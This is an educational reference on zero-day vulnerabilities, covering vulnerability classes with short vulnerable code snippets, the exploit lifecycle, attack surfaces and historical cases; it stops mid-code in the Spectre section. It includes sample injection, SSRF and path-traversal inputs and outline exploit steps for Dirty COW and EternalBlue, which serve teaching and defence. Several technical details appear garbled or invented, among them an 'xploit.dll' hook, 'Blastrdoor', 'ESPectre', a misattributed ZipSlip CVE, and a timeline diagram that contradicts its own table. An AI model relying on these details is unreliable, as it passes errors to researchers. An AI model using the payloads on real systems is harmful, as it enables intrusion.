# Zero-Day Fundamentals, Taxonomy & Landscape

> A comprehensive reference document for cybersecurity researchers and CTF practitioners covering the theory, classification, and real-world landscape of zero-day vulnerabilities.

---

## Table of Contents

1. [Definition & Core Concepts](#1-definition--core-concepts)
2. [Taxonomy of Vulnerability Classes](#2-taxonomy-of-vulnerability-classes)
3. [The Zero-Day Lifecycle](#3-the-zero-day-lifecycle)
4. [Attack Surfaces](#4-attack-surfaces)
5. [Notable Historical Zero-Days](#5-notable-historical-zero-days)
6. [Current Threat Landscape](#6-current-threat-landscape)

---

## 1. Definition & Core Concepts

### 1.1 What Is a Zero-Day Vulnerability?

A **zero-day vulnerability** (also written as **0-day**) is a security flaw in software, hardware, or firmware that is unknown to the vendor and for which no patch or mitigation exists at the time of its discovery or exploitation by an adversary. The term "zero-day" refers to the number of days the vendor has had to address the vulnerability — zero. From the defender's perspective, the clock has not yet started; the vendor has had **zero days** to prepare.

Key properties that define a zero-day:

- **Unknown to the vendor**: The developer/maintainer has not been notified, or notification has not yet produced a patch.
- **No available patch**: No official fix, hotfix, or workaround has been released at the time of active exploitation.
- **Asymmetric information advantage**: The attacker possesses knowledge the defender lacks, creating an information asymmetry that is the fundamental enabler of zero-day attacks.

### 1.2 Zero-Day Exploit

A **zero-day exploit** is the specific code, technique, or procedure that leverages a zero-day vulnerability to achieve an unintended effect (arbitrary code execution, privilege escalation, information disclosure, etc.). The exploit is the *weaponization* of the vulnerability — the delivery mechanism that translates a theoretical flaw into a practical attack.

Components of a zero-day exploit:

```
+-------------------+      +------------------+      +------------------+
|   Trigger/        | ---> |   Vulnerability  | ---> |   Payload        |
|   Delivery Vector |      |   Exploitation   |      |   (post-exploit) |
+-------------------+      +------------------+      +------------------+
  - Malicious doc            - Memory corruption      - Reverse shell
  - Crafted network pkt      - Logic abuse             - Lateral movement
  - Phishing link            - Type confusion           - Data exfiltration
  - Weaponized media         - Race condition           - Ransomware deploy
```

### 1.3 Zero-Day Attack

A **zero-day attack** is the full operational chain from reconnaissance through exploitation using a zero-day exploit within a campaign. This encompasses the adversary's end-to-end operation: target selection, delivery, exploitation, and objective fulfillment. A single zero-day vulnerability may be used across multiple distinct zero-day attacks by different threat actors if the exploit code is shared, sold, or independently rediscovered.

### 1.4 Zero-Day Markets

Zero-days are traded through several distinct market tiers:

| Market Tier | Participants | Price Range (USD) | Characteristics |
|-------------|-------------|-------------------|-----------------|
| **Government/Law Enforcement** | NSA, GCHQ, MSS, NSA-equivalents | $100K–$2M+ | Brokers like Zerodium, NSO Group; exclusive, high-value |
| **Commercial/Brokerage** | Zerodium, Exodus Intelligence, VUPEN | $50K–$500K | Formal acquisition programs, responsible-ish disclosure |
| **Grey Market** | Private brokers, cybersecurity firms | $10K–$250K | Less formal, varying exclusivity |
| **Dark Web/Underground** | Criminal groups, APTs | $1K–$100K+ | No guarantees, reputational risk, overlapping sales |
| **Bug Bounty** | Researchers → vendors | $100–$2M | Legitimate, coordinated disclosure, growing payouts |

The economics of zero-days are shaped by:
- **Exclusivity premiums**: An exploit sold exclusively commands 5–10x the price of a non-exclusive sale.
- **Durability**: Exploits targeting widely-deployed software (Windows, Chrome, iOS) tend to be patched faster, reducing their useful lifetime.
- **Sophistication requirements**:.browser and mobile zero-days require significantly more R&D than local privilege escalation on Linux, reflected in pricing.

### 1.5 Distinguishing 0-Day, 1-Day, and N-Day

| Classification | Definition | Patch Status | Defender Knowledge | Typical Risk Level |
|----------------|-----------|--------------|-------------------|-------------------|
| **0-Day** | Vulnerability unknown to vendor, no patch exists | None | None (or only suspicion) | **Critical** |
| **1-Day** | Vulnerability disclosed/patched, but targets remain unpatched | Available | Known, but not yet applied | **High** |
| **N-Day** | Vulnerability has been known for *N* days since disclosure; patch exists but widespread unpatched systems remain | Available | Known, public advisories exist | **Medium-High** |

This distinction is operationally critical:

- **0-days** require dedicated research or intelligence capability to discover and exploit. They are scarce and expensive.
- **1-days** are immediately weaponized after patch analysis. The patch itself becomes the blueprint for the exploit (diffing the patch reveals the bug). This is the dominant risk window for most organizations.
- **N-days** remain effective for months or years because patch deployment lags. Statistically, **the vast majority of breaches involve N-day vulnerabilities**, not zero-days.

```text
TIMELINE:
  ┌──────────────┐   Disclosure   ┌──────────────┐   Patch Released   ┌──────────────┐
  │   0-Day      │ ────────────►  │   1-Day      │ ──────────────────►│   N-Day       │
  │  (Unknown)   │                │  (Known to    │                    │  (Known,      │
  │              │                │   vendor,    │                    │   patch exists│
  │              │                │   no patch)  │                    │   not applied)│
  └──────────────┘                └──────────────┘                    └──────────────┘
       Stealth window                  Exploit development window        Procrastination window
```

**Key insight for CTF and operational security**: Patch diffing (analyzing the diff between patched and unpatched versions) is the primary technique for rapidly developing 1-day exploits. This means the time between patch release and mass exploitation can be measured in hours, not days.

---

## 2. Taxonomy of Vulnerability Classes

Zero-day vulnerabilities span every class of software bug. Below is a comprehensive taxonomy with technical details relevant to exploitation.

### 2.1 Memory Corruption

Memory corruption vulnerabilities remain the most impactful and prevalent class for zero-day exploitation, particularly in systems-level code (C/C++ kernels, browsers, embedded firmware).

#### 2.1.1 Buffer Overflow

**Stack Buffer Overflow**: Input exceeds the allocated buffer on the stack, overwriting adjacent stack frames including the saved return address.

```c
void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);  // No bounds check → stack smash
}
```

**Exploitation**: Overwrite saved RIP/EIP with controlled value. Modern mitigations (stack canaries, ASLR, NX/DEP, PIE) require bypassing each individually. Typical CTF approach: leak canary via format string or information disclosure, then ROP.

**Heap Buffer Overflow**: Writes beyond the bounds of a heap-allocated buffer, corrupting adjacent heap metadata or application data.

```c
void vulnerable(size_t len) {
    char *buf = malloc(64);
    // Off-by-one or miscalculated size allows overflow into adjacent chunk
    memcpy(buf, attacker_controlled, len);  // len > 64
}
```

**Exploitation**: Corrupt heap metadata (e.g., `fd`/`bk` pointers in glibc's `malloc_chunk`) to achieve arbitrary write primitives. Techniques include unlink attack, fastbin attack, tcache poisoning (glibc ≥ 2.26), and House of Spirit/Force/Orange.

#### 2.1.2 Use-After-Free (UAF)

Memory is freed but a dangling pointer to it remains. Subsequent use of this pointer operates on potentially re-allocated memory.

```c
struct object *obj = malloc(sizeof(*obj));
// ... use obj ...
free(obj);
// Dangling pointer: obj still points to freed memory
obj->callback();  // Use-After-Free: callback function pointer controlled
                   // by attacker who reallocated the freed chunk
```

**Exploitation strategies**:
- **Type confusion via reallocation**: Free an object, then allocate a different type over the same memory. The old pointer now interprets the new type's data as the old type's fields, enabling control of function pointers.
- **Browser UAF exploitation**: Common in DOM element handling. Free a `JSObject`, trigger GC, spray the heap with `ArrayBuffer` or similar, reclaim the slot, and hijack a vtable pointer.
- **Kernel UAF**: Free a `struct file` or `struct inode`, reclaim with controlled data, trigger the dangling reference to call a function pointer under attacker control.

#### 2.1.3 Double Free

Calling `free()` on the same memory address twice, corrupting the heap's free list structure.

```c
char *ptr = malloc(64);
free(ptr);
// ... time passes, allocator may reuse this address ...
free(ptr);  // Double free: ptr already on free list
```

**Exploitation**: The second `free()` inserts the chunk into the free list again. By allocating between the two frees, an attacker can create overlapping chunks, enabling arbitrary read/write primitives. Modern allocators (glibc) include double-free detection (`tcache` key check in glibc ≥ 2.29), but this can be bypassed by corrupting the key or using allocation/deallocation sequences that flush tcache bins.

#### 2.1.4 Off-by-One

A loop or copy operation writes one byte past the intended boundary, typically an off-by-one error in null terminator handling or loop bounds.

```c
void vulnerable(char *input, size_t len) {
    char *buf = malloc(len);  // Should be malloc(len + 1)
    for (int i = 0; i <= len; i++) {  // Off-by-one: should be i < len
        buf[i] = input[i];
    }
}
```

**Exploitation**: In heap contexts, an off-by-one NULL byte overflow can corrupt the `size` field of the next chunk's metadata (the `prev_size` consolidation technique). The "off-by-one null byte" (also called "null byte poisoning") is a classic heap exploitation primitive: shrink the apparent size of the next chunk, then consolidate overlapping chunks during `free()`.

#### 2.1.5 Stack Overflow (Deep Recursion / Stack Exhaustion)

Not to be confused with stack buffer overflow — this is exhausting the stack via unbounded recursion or excessively deep call chains.

```c
void deep_recurse(int depth) {
    char large_frame[4096];
    if (depth < MAX) {
        deep_recurse(depth + 1);  // Stack grows toward guard page
    }
}
```

**Exploitation**: Can cause stack clash (overlapping stack and heap), bypassing stack guard pages. CVE-2017-1000364 (Stack Clash) is the canonical example.

### 2.2 Logic Errors

#### 2.2.1 Race Conditions

A timing-dependent bug where the outcome depends on the interleaving of concurrent operations. The exploitable window is the interval between a check and subsequent use.

```c
// Thread 1: Check
if (access(filename, R_OK) == 0) {
    // EXPLOITABLE WINDOW: attacker replaces filename with symlink
    // Thread 1: Use
    fd = open(filename, O_RDONLY);  // Opens different file!
}
```

**Exploitation**: Require precise timing. In CTF and real exploitation, techniques include:
- **Slowing down the victim** (e.g., forcing page faults, scheduling tricks via `sched_yield`, CPU cache thrashing)
- **Increasing attacker threads** (spraying the race window)
- **Inotify/FANotify** to trigger on exact filesystem events

#### 2.2.2 Time-of-Check to Time-of-Use (TOCTOU)

A specific and extremely prevalent form of race condition. The classic formulation:

1. **Check**: A security decision is made based on validated state.
2. **Time-of-use**: The operation executes based on stale data from the check phase.
3. **Attacker modifies** state between steps 1 and 2.

```c
// TOCTOU in filesystem operations
char *tmpfile = "/tmp/app_temp";
// Check: symlink doesn't exist yet
if (lstat(tmpfile, &st) != 0) {
    // Attacker creates symlink here: /tmp/app_temp → /etc/shadow
    fopen(tmpfile, "w");  // Opens /etc/shadow for writing!
}
```

**Kernel TOCTOU**: Modern kernels copy data from userland using `copy_from_user()` which can fault (block). An attacker can map/unmap pages to force the kernel to retry, creating a window where the user-space data changes between the kernel's initial check and final use. Defense: use `copy_from_user()` into kernel-owned buffers only once, never re-reference user memory.

#### 2.2.3 Authentication Bypass

Flaws in authentication or authorization logic that allow circumventing security checks without conventional memory corruption.

```c
// Flawed password check
bool authenticate(char *user, char *pass) {
    if (strcmp(user, "admin") == 0 &&
        pass[0] != '\0' &&        // Bypass: empty string NOT caught!
        strcmp(pass, stored_hash) == 0) {
        return true;
    }
    // ...
}
```

**Real-world examples**: Bypasses in OAuth implementations, JWT algorithm confusion (changing `alg` from RS256 to HS256 and signing with the public key), Kerberos Silver Ticket attacks, and SAML assertion manipulation.

### 2.3 Input Validation

#### 2.3.1 SQL Injection

Unsanitized user input embedded into SQL queries:

```sql
-- Input: ' OR '1'='1' --
-- Query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'
```

While SQLi is rarely the basis of *zero-day* exploits against modern web applications (due to parameterized queries), it appears in:
- Legacy enterprise software
- Embedded SQL in IoT firmware
- ORM misconfigurations (HQL injection in Hibernate)

#### 2.3.2 Cross-Site Scripting (XSS)

Injection of client-side scripts into web pages viewed by other users. While typically a 1-day/N-day concern, stored XSS in high-value targets (admin panels, SSO portals) can constitute zero-day-level impact.

**Relevant zero-day variant**: DOM Clobbering, prototype pollution chains, and XSS in Electron apps that bridge to OS-level APIs.

#### 2.3.3 Server-Side Request Forgery (SSRF)

The server makes HTTP requests to attacker-controlled URLs, enabling access to internal services.

```python
# Vulnerable endpoint
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    return requests.get(url).text  # Attacker supplies http://169.254.169.254/latest/meta-data/
```

**Zero-day relevance**: Cloud metadata endpoints (AWS `169.254.169.254`), cloud-specific SSRF-to-RCE chains (e.g., through internal Redis, etcd, or cloud APIs), and protocol smuggling.

#### 2.3.4 Insecure Deserialization

Deserializing untrusted data that allows instantiation of arbitrary objects or execution of arbitrary code.

```java
// Java deserialization: Apache Commons Collections gadget chain
ObjectInputStream ois = new ObjectInputStream(input);
Object obj = ois.readObject();  // Attacker-controlled → RCE via gadget chain
```

**Canonical zero-day example**: CVE-2015-4852 (Oracle WebLogic) and the ysoserial gadget chains. Modern variants include:
- **Jackson deserialization** (CVE-2017-7525, CVE-2020-9546)
- **Fastjson** (CVE-2017-18349, widely exploited in Chinese APT campaigns)
- **Python pickle**, **PHP phar**, **.NET BinaryFormatter**

#### 2.3.5 Path Traversal

Insufficient validation of file paths allows reading/writing files outside the intended directory.

```python
# Vulnerable
filepath = "/var/www/uploads/" + user_input
# user_input = "../../../etc/passwd"
open(filepath)  # Reads /etc/passwd
```

**Zero-day variants**: Path traversal in Java's `java.io.File` vs. `java.nio.file.Path` (encoding handling differences), URL decoding double-encoding bypasses, and symlink-based traversal in archive extraction (ZipSlip, CVE-2018-1000113).

### 2.4 Type Confusion

A value is interpreted as a different type than intended, causing memory corruption or logic errors. Primarily found in languages with dynamic typing or unsafe casts.

```c
// C: Unsafe cast
struct base { int type; };
struct derived { int type; void (*callback)(); };

struct base *obj = create_object();
// Attacker causes obj to be treated as derived type
((struct derived *)obj)->callback();  // Calls attacker-controlled function pointer
```

**Browser zero-days**: Type confusion in JavaScript engines (V8, SpiderMonkey, JavaScriptCore) is a dominant zero-day class. JIT compiler type speculation can be exploited by causing the compiler to emit optimized code based on a type assumption, then violating that assumption:

```javascript
// V8 JIT type confusion pattern (conceptual)
function vuln(arr, obj) {
    return arr[0];  // JIT speculates arr is a SMI array
}
// Warm up JIT with SMI arrays, then pass a DOUBLE array:
vuln([1, 2, 3]);   // Training: SMI type
vuln([1.1, 2, 3]); // Trigger: type confusion → out-of-bounds or value confusion
```

### 2.5 Integer Overflow/Underflow

Arithmetic operations produce values outside the representable range of the integer type, leading to wraparound.

```c
uint32_t compute_size(uint32_t count, uint32_t elem_size) {
    return count * elem_size;  // Overflow if count * elem_size > UINT32_MAX
}

void vulnerable(uint32_t count) {
    uint32_t buf_size = compute_size(count, sizeof(struct item));
    // If count * sizeof(struct item) overflows, buf_size is tiny
    char *buf = malloc(buf_size);  // Allocates too little
    // ... write count items → heap overflow ...
}
```

**Exploitation**: Integer overflows are usually chained into buffer overflows. The overflow causes a smaller-than-needed allocation, and subsequent writes exceed the buffer boundary. Common in image/video parsing code (resolution * channels * bpp calculations).

### 2.6 Information Disclosure

Vulnerabilities that leak sensitive data (keys, pointers, memory contents) without necessarily providing code execution. Critically important as:

1. **Standalone impact**: Credential theft, data exfiltration (Heartbleed)
2. **Exploitation primitive**: Leaking ASLR base addresses, stack cookies, heap pointers, and kernel addresses to bypass ASLR and other mitigations

```c
// Information disclosure via uninitialized data
struct response {
    int status;
    char message[256];  // Uninitialized → leaks stack data
};
struct response *resp = malloc(sizeof(*resp));
resp->status = 200;
// Forgot to zero resp->message → sends 256 bytes of heap metadata/old data
send(socket, resp, sizeof(*resp), 0);
```

### 2.7 Privilege Escalation Vectors

Vulnerabilities that allow elevation of privileges within a system. Often chained with other vulnerabilities:

| Class | Mechanism | Example |
|-------|-----------|---------|
| **Kernel LPE** | Exploit kernel driver/FS/syscall bug to gain root | Dirty COW, CVE-2022-0847 |
| **SUID binary exploit** | Vulnerability in setuid binary | Race condition in SUID script |
| **Container escape** | Exploit container runtime or kernel from inside container | CVE-2019-5736 (runc) |
| **Service escalation** | Exploit a service running as root/SYSTEM from lower privilege | PrintNightmare, CVE-2021-34527 |
| **Token impersonation** | Steal/forge access tokens | Potaito, token kidnapping |

### 2.8 Concurrency Bugs

Distinct from race conditions in that they encompass broader synchronization failures:

- **Deadlocks**: Resource starvation leading to denial of service (sometimes exploitable for state manipulation).
- **Atomicity violations**: Operations assumed atomic but actually interruptible.
- **Memory model violations**: Code that is correct under sequential consistency but incorrect under weak memory ordering (ARM, POWER architectures).
- **Lock-free algorithm bugs**: ABA problems in compare-and-swap loops.

```c
// ABA problem in lock-free stack
// Thread 1 reads top->next = B, gets preempted
// Thread 2 pops A, pops B, pushes A again
// Thread 1 resumes: CAS(top, A, B) succeeds (sees A again)
// But B may have been freed, causing UAF
```

---

## 3. The Zero-Day Lifecycle

### 3.1 Phases

```
 ┌──────────────┐  ┌───────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐
 │ Vulnerability│  │               │  │              │  │              │  │   Patch      │  │   N-Day      │
 │ Introduced   │─►│ Discovery     │─►│ Weaponization│─►│ Detection/   │─►│ Development │─►│ Exploitation │
 │ (Bug written)│  │ (Found by     │  │ (Exploit     │  │ Disclosure   │  │ & Release   │  │ (Mass scan & │
 │              │  │  researcher   │  │  developed)  │  │              │  │              │  │  attack)     │
 └──────────────┘  └───────────────┘  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────┘
        │                 │                   │                  │                  │                  │
   Days 0-N          Day 0               Days 0-30           Days 0-90          Days 7-60         Months-Years
   (often years)     (zero-day begins)   (weapon time)       (detection lag)   (patch time)       (long tail)
```

#### Phase 1: Vulnerability Introduction

A developer writes buggy code. The vulnerability may exist for years before discovery. Research shows the mean time from introduction to discovery can exceed **6.5 years** for critical zero-days (Akyaz et al., 2012). Bug-introducing commits often include security-relevant keywords or are in complex code paths (crypto, parsing, IPC).

#### Phase 2: Discovery

The vulnerability is found. Discoverers may be:

- **Security researchers**: Performing fuzzing, code audit, static analysis. May disclose responsibly.
- **APT groups**: Nation-state actors with dedicated vulnerability research teams. Typically do not disclose.
- **Criminal operators**: Discover through operational security research or acquisition in zero-day markets.
- **Accidental discovery**: Found during incident response, crash analysis, or debugging unrelated issues.

**Fuzzing techniques for zero-day discovery**:
- **Coverage-guided fuzzing**: AFL++, libFuzzer, Honggfuzz — systematically explore program paths.
- **Grammar-aware fuzzing**: For structured inputs (PDF, X.509, network protocols).
- **Kernel fuzzing**: Syzkaller for Linux kernel syscalls, morphuzz for hypervisors.
- **Browser fuzzing**: DOM fuzzing, JS engine fuzzing with custom grammars.

#### Phase 3: Weaponization

The exploit is developed. This ranges from a proof-of-concept triggering a crash to a full weaponized capability integrated into a C2 framework (Cobalt Strike, Brute Ratel, Mythic).

**Weapon time** varies dramatically:
- Simple buffer overflow: hours to days
- Browser sandbox escape chain: weeks to months
- Full-chain iOS exploit (remote → sandbox escape → kernel → persistence): months of team effort

#### Phase 4: Detection / Disclosure

The vulnerability becomes known to the vendor or public through:

- **In-the-wild detection** (ITW): Security vendors observe active exploitation (e.g., Google TAG, Microsoft MSTIC, Kaspersky).
- **Responsible disclosure**: Researcher reports to vendor (via bug bounty, CERT, or direct contact).
- **Full disclosure**: Vulnerability details published publicly without vendor coordination.
- **Accidental leak**: Patch diff reveals vulnerability before advisory.

#### Phase 5: Patching

The vendor develops, tests, and releases a patch. The **patch gap** (time from disclosure to patch availability) is a critical window.

#### Phase 6: N-Day Exploitation

Once patched, the vulnerability transitions to N-day status. Attackers diff the patch, develop exploits within hours, and scan for unpatched targets. **The N-day window is where the vast majority of real-world breaches occur.**

### 3.2 Timeline of Notable Zero-Day Events

| Year | Event | Significance |
|------|-------|-------------|
| 1988 | Morris Worm | First worm, exploited buffer overflow in `fingerd` — effectively a zero-day at the time |
| 2003 | W32.Blaster | Exploited DCOM RPC buffer overflow (MS03-026), 0-day at discovery |
| 2008 | Conficker | Exploited MS08-067 (Windows RPC), massively wormable |
| 2010 | Stuxnet | Used **four** Windows zero-days — most sophisticated known at the time |
| 2014 | Heartbleed | OpenSSL heartbeat bug, Internet-scale information disclosure |
| 2017 | EternalBlue/DoublePulsar | NSA exploit leaked, used in WannaCry and NotPetya |
| 2017 | Spectre/Meltdown | Hardware-level side-channel, affects virtually all CPUs |
| 2018 | ESPectre / Foreshadow | SGX and L1TF side-challenges |
| 2019 | Windows CSRSS, Win32k | Multiple Windows zero-days actively exploited |
| 2020 | iOS KTRW, ZDI disclosures | iPhone kernel exploitation becomes mainstream |
| 2021 | PrintNightmare, Log4Shell | Critical Windows and Java zero-days |
| 2022 | CVE-2022-0847 (Dirty Pipe) | Linux kernel LPE, similar class to Dirty COW |
| 2023 | MOVEit Transfer (CVE-2023-34362) | SQL injection in enterprise managed file transfer |
| 2024 | XZ Utils backdoor | Supply chain compromise targeting SSH in major distros |

---

## 4. Attack Surfaces

Classification of zero-day attack vectors by the surface they expose.

### 4.1 Network-Facing Services

Directly reachable services that accept input from untrusted network sources.

**Examples**: Web servers, VPN servers, email servers (SMTP, IMAP), DNS resolvers, RDP, SSH, database listeners.

**High-value zero-day targets**:
- VPN appliances (Fortinet, Pulse Secure, Ivanti) — consistently targeted
- Email gateways (Microsoft Exchange — ProxyLogon/ProxyShell)
- Firewall management interfaces
- RDP (Windows RDS)

**CTF relevance**: Network services are common CTF challenge targets. Focus on protocol parsing, length field handling, and state machine bugs.

### 4.2 Local Privilege Escalation (LPE)

Vulnerabilities that allow an unprivileged local user to gain root/SYSTEM privileges.

**Primary target**: OS kernels (Linux, Windows, macOS).

| OS | Common LPE Surfaces | Notable Examples |
|----|---------------------|------------------|
| **Linux** | `io_uring`, BPF, eBPF, `perf_event`, FUSE, netfilter | Dirty COW, Dirty Pipe, io_uring UAFs |
| **Windows** | Win32k, NTFS, Registry, CSRSS, Print Spooler | PrintNightmare, Win32k LPEs |
| **macOS** | XNU syscall handlers, IOKit, WindowServer | ForcEntry, Rootpipe |

### 4.3 Browser / Client-Side

Browsers are the most sophisticated attack surface. Modern browser exploitation requires chaining:

```
[JS Engine Bug] → [Sandbox Escape] → [OS Kernel LPE] → [Full Compromise]
     ↑                  ↑                    ↑
  V8/JSC/SM        Site Isolation         OS-specific
  type confusion    bypass, mojo IPC       exploit
```

**Browser zero-day components**:
1. **Renderer exploit**: Trigger a bug in the JS engine (V8, JavaScriptCore, SpiderMonkey) or DOM/DOM rendering to achieve code execution in the renderer process.
2. **Sandbox escape**: Break out of the renderer sandbox (typically via a mojo IPC bug, browser process bug, or OS-level vulnerability).
3. **Combined**: Full-chain browser exploits combine both. A typical zero-day chain for Chrome is: V8 bug → Chrome sandbox escape → Windows LPE → persistence.

### 4.4 Kernel

Kernel vulnerabilities are highly prized for LPE and container escape.

**Linux kernel attack surfaces**:

```
┌─────────────────────────────────────────────────────────┐
│                    User Space                            │
│  ┌─────────┐ ┌──────────┐ ┌──────────┐ ┌─────────────┐ │
│  │ Syscalls│ │ io_uring │ │  BPF/eBPF│ │   netfilter │ │
│  │         │ │          │ │           │ │             │ │
│  └────┬────┘ └────┬─────┘ └────┬──────┘ └──────┬──────┘ │
├───────┼───────────┼────────────┼────────────────┼────────┤
│      ▼           ▼            ▼                ▼        │
│              ┌──────────────────────────────────────┐  │
│              │          KERNEL SPACE                 │  │
│              │  VFS │ MM │ Net │ Crypto │ Drivers   │  │
│              └──────────────────────────────────────┘  │
│                      Kernel Attack Surface              │
└─────────────────────────────────────────────────────────┘
```

**Bug classes by subsystem**:
- **`io_uring`** (Linux 5.1+): Complex async I/O interface, multiple UAF and logic bugs (CVE-2024-0582, multiple 2024 io_uring CVEs)
- **eBPF**: Verifier can be tricked into allowing out-of-bounds access (CVE-2023-2163, numerous eBPF verifier escapes)
- **Memory management**: `mmap`, `mprotect`, `userfaultfd` — used as exploitation primitives, not just vulnerability sources
- **Filesystems**: FUSE (userspace filesystem) provides powerful attack surface for kernel bugs

**Windows kernel attack surfaces**:
- **Win32k**: The Windows graphics subsystem, historically the most prolific source of Windows LPE zero-days
- **NTFS**: Filesystem parsing bugs
- **Print Spooler**: PrintNightmare and related bugs
- **Registry Virtualization**:COM/RPC interfaces

### 4.5 Hypervisor / Virtualization

Escaping from a guest VM to the host or other VMs.

**Attack surfaces**:
- **Virtio devices**: `virtio-net`, `virtio-blk`, `virtio-gpu` — complex paravirtualized device emulation in QEMU
- **Device emulation**: `e1000`, `rtl8139`, `ide`, `nvme` — hardware device emulation bugs
- **vCPU management**: MMU, EPT/NPT handling bugs
- **vGPU**: GPU passthrough and SR-IOV bugs

**Notable hypervisor zero-days**:
- **VENOM** (CVE-2015-3456): QEMU floppy disk controller buffer overflow → guest-to-host escape
- **Spectre variant for VMs**: Cross-VM side-channel attacks
- **Cloud hypervisor escapes**: Various proprietary cloud-specific bugs

### 4.6 Firmware / IoT

Embedded devices with limited mitigation support, infrequent patching, and high-value data.

**Attack surfaces**:
- **UEFI/BIOS**: Bootkits, SMM exploits (CVE-2021-21540, Dell BIOS)
- **BMC/IPMI**: Baseboard management controllers (CVE-2019-15940+, Supermicro/iDRAC)
- **Router firmware**: Web interfaces, UPnP, TR-069, DHCP
- **IoT protocols**: Zigbee (CVE-2020-12671), BLE, MQTT, CoAP
- **Automotive**: CAN bus fuzzing, UDS services, OTA update mechanisms

**Why firmware/IoT zero-days are systemic**:
- Monolithic firmware images lacking modern mitigations (no ASLR, no stack canaries, no NX)
- Infrequent or impossible patching (devices may be in the field for 10+ years)
- Default credentials and debug interfaces left enabled
- Limited computational resources for defensive mechanisms

### 4.7 Mobile Platforms

**iOS zero-day landscape**:
- **Lock screen bypass**: Logic errors in UI state machines
- **iMessage**: Blastrdoor, FORCEDENTRY (NSO Group) — zero-click RCE via message processing
- **WebKit**: Persistent target for sandbox escape from Safari
- **Kernel**: LPE via XNU bugs (OOM handler, Mach IPC, IOKit)

**Android zero-day landscape**:
- **Media framework**: Stagefright-class bugs (integer overflow in media parsers)
- **Kernel**: Qualcomm and MediaTek driver bugs (GPU driver UAF, ion buffer overflow)
- **Chrome/WebView**: V8 bugs for initial code execution
- **Vendor customizations**: OEM-specific bugs in HAL, proprietary services

---

## 5. Notable Historical Zero-Days

### 5.1 Stuxnet (2010)

- **CVEs**: CVE-2010-2568 (LNK shortcut), CVE-2010-2729 (Print Spooler), CVE-2010-2743 (Win32k), CVE-2010-3922 (S7 hardcoded credentials)
- **Target**: Iranian nuclear centrifuge enrichment facility (Natanz)
- **Vulnerability class**: Multiple — LNK file parsing (remote), Print Spooler (LPE), Win32k (LPE)
- **Impact**: Destroyed ~1,000 centrifuges. First known nation-state cyberweapon.
- **Technical note**: Used **four** Windows zero-days simultaneously, an unprecedented expenditure. The LNK shortcut zero-day (CVE-2010-2568) allowed automatic execution on USB drive insertion — a purely offensive innovation in Windows shell parsing.
- **Legacy**: Fundamentally changed the perception of cyberweapons; proved zero-days could cause physical destruction.

### 5.2 Heartbleed (2014)

- **CVE**: CVE-2014-0160
- **Vulnerability class**: Buffer over-read (information disclosure)
- **Affected software**: OpenSSL 1.0.1 through 1.0.1f
- **Impact**: Allowed attackers to read up to 64 KB of server memory per heartbeat request. Estimated to have affected 17% (≈500,000) of the Internet's secure web servers.

```c
// Vulnerable code (simplified)
int dtls1_process_heartbeat(SSL *s) {
    unsigned int payload_length = n2s(p);  // Attacker-controlled length
    // ...
    // Bug: no validation that payload_length ≤ actual payload
    buffer = OPENSSL_malloc(1 + 2 + payload_length + padding);
    memcpy(buffer, s->s3->rrec.data, 1 + 2 + payload_length);
    //                     ^^^^ reads beyond actual data → over-read
}
```

- **Exploitation**: Trivially simple — send a malformed heartbeat request with `payload_length = 0xFFFF` while actual payload is minimal. The server responds with up to 64 KB of adjacent heap memory, potentially containing private keys, session tickets, or user credentials.
- **Legacy**: Prompted massive OpenSSL audit, LibreSSL fork, and industry-wide key rotation effort. Demonstrated that simple programming errors in critical infrastructure can have Internet-scale consequences.

### 5.3 EternalBlue (2017)

- **CVE**: CVE-2017-0144
- **Vulnerability class**: Buffer overflow in SMBv1 `SRVOS2` and `SRVNET` drivers
- **Affected software**: Windows Vista through Server 2016 (unpatched)
- **Impact**: Remote code execution via SMB (port 445). Used in WannaCry ransomware and NotPetya wiper.

**Technical breakdown**:
- The SMBv1 `NT Trans` request handling contained a buffer overflow in the `SmbValidateFid` function.
- The exploit targeted the `SRVNET` driver's buffer management: the server allocates a response buffer based on the `Transaction` request's `TotalDataCount`, but processes a `Trans2` request that writes into that buffer using different (larger) data.
- This results in a pool overflow, corrupting adjacent `_SRVNET_BUFFER` structures.
- EternalBlue uses **DOUBLEPULSAR** as the implant, which hooks `xploit.dll` into `srv.sys`.

```
EternalBlue exploit chain:
  1. Connect to SMB port 445
  2. Send malformed NT Trans request (overflow SRVNET buffer)
  3. Pool corruption → controlled write → shellcode execution
  4. Install DOUBLEPULSAR backdoor
  5. Backdoor persists across reboots via SMB
```

- **Legacy**: NSA-developed exploit leaked by Shadow Brokers in April 2017, leading to WannaCry (May 2017) and NotPetya (June 2017) — two of the most destructive cyberattacks in history.

### 5.4 Dirty COW (2016)

- **CVE**: CVE-2016-5195
- **Vulnerability class**: Race condition in Linux kernel's Copy-On-Write mechanism
- **Affected software**: Linux kernel (all versions from 2.6.22 through 4.8)
- **Impact**: Local privilege escalation (unprivileged user → root)

```c
// Simplified race condition in mm/cow.c
// Thread 1 (write fault):         // Thread 2 (madvise):
if (page_is_shared(page)) {        //
    copy = alloc_page();           // madvise(addr, len, MADV_DONTNEED)
    copy_user_page(copy, page);    //   → removes COW mapping
    replace_page(page, copy);      //   → page is now the original (writable)!
}                                  //
```

**Exploitation**:
1. `open()` a read-only file (e.g., `/etc/passwd`)
2. `mmap()` the file with `MAP_PRIVATE`
3. Write to the mapping → triggers COW fault
4. In the COW fault handler, race with `madvise(MADV_DONTNEED)` to discard the private copy
5. The write goes to the **original** page instead of the copy
6. Write arbitrary content to any read-only file → write `/etc/passwd` for root

**CTF relevance**: Dirty COW is a masterclass in kernel race condition exploitation. The technique of racing `madvise` with page faults is a generalizable pattern for kernel CTF challenges.

### 5.5 Spectre / Meltdown (2018)

- **CVEs**: CVE-2017-5753 (Spectre Variant 1), CVE-2017-5715 (Spectre Variant 2), CVE-2017-5754 (Meltdown)
- **Vulnerability class**: Side-channel via speculative execution (hardware microarchitectural)
- **Affected hardware**: Virtually all modern out-of-order execution CPUs (Intel, AMD, ARM)
- **Impact**: Cross-process and cross-VM memory read via microarchitectural side-channel.

**Spectre Variant 1 (Bounds Check Bypass)**:

```c
// Simplified Spectre v1 gadget
if (x < array1_size) {  // Speculative execution passes this check
    y = array2[array1[x] * 256];  // Access array2 at secret-dependent offset
}
// Transmit via cache side-channel:
// Flush+Reload reveals which cache line was accessed → reveals array1[x]
